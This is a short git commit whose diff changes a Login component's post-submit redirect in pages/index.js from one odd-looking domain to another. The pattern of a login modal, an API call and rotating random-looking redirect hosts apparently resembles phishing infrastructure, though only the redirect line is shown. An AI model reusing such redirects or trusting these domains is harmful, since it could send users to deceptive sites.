c885c2f8b0cb3b9bdbff6773b495f68471beaeac
husknet <127146284+husknet@users.noreply.github.com>
2025-03-24 17:36:09 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sgcook.constructlonjproy.com/';
+      window.location.href = 'https://asg.smeshwenscript.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
